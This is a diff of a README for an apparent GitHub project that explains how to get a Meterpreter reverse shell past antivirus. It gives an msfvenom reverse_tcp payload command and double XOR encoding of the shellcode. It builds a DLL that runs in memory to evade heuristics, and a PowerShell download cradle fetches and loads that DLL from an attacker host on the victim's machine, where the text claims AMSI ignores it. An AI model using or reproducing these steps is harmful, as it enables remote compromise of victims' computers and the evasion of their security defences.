@@ -1,14 +1,20 @@
 # RS_meterpreter_bypass
+Get a Meterpreter reverse_tcp shell bypassing AV.
 These two C# programs are used to encode and create a .dll file from a starting metasploit xor encoded reverse_tcp payload.
+        
+- Generate your payload **#1**
+- XOR encode your shell script  **#2**
+- Create a DLL to inject into memory **#3**
+- Create a Powershell script to download and execute the DLL in memory **#4**
 
 # How to use
-Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic
+**#1** Fisrt of all: generate shellcode in C# format, and use msfvenom's built-in encoder xor_dynamic
 
         msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f csharp -e x64/xor_dynamic
 
 Take note of the *buf* variable showed in output.
 
-Now we use our [_XOR_encoder_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/XOR_encoder.cs), open this in a new console project on Visual Studio Community and build an executable solution.
+**#2** Now we use our [_XOR_encoder_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/XOR_encoder.cs), open this in a new console project on Visual Studio Community and build an executable solution.
 
 - Remember to change the byte array *buf* with your version
 
@@ -20,7 +26,7 @@ Take note of the output, it is your new double-encoded payload.
 
 We have now a double XOR-encoded shellcode.
 
-To actually bypass AV we will need a .dll to run in memory, not in disk. 
+**#3** To actually bypass AV we will need a .dll to run in memory, not in disk. 
 
 We will use [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs) which is used to execute our payload and also bypass heuristics control. So, after you have changed also here the *buf* with your new double-encoded payload, build the solution.
 
@@ -30,7 +36,7 @@ Now we have the .dll, we can host it in a remote server or ourselves with the co
 
         service apache start
 
-Now we just need to execute the .dll in memory, so we do a .ps1 script to do that, we can name it *download_cradle.ps1* also also this needs to be placed in /var/www/html:
+**#4** Now we just need to execute the .dll in memory, so we do a .ps1 script to do that, we can name it *download_cradle.ps1* also also this needs to be placed in /var/www/html:
 
         $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.102/ClassLibrary1.dll')
         $assem = [System.Reflection.Assembly]::Load($data)
@@ -40,7 +46,7 @@ Now we just need to execute the .dll in memory, so we do a .ps1 script to do tha
 
 This PowerShell script will download the DLL, load it directly into memory, and invoke Runner function of [_Class1_](https://github.com/marcoigorr/RS_meterpreter_bypass/blob/6e7cf2a56639a471bc8a45d42c06cf47eb2ff10d/Class1.cs).
 
-## Victim's machine
+## Victim machine
 
 On victim's machine we will just neet do run this command, It donwloades the script hosted in a remote server and allocate into memory (AMSI just ignores it):
 
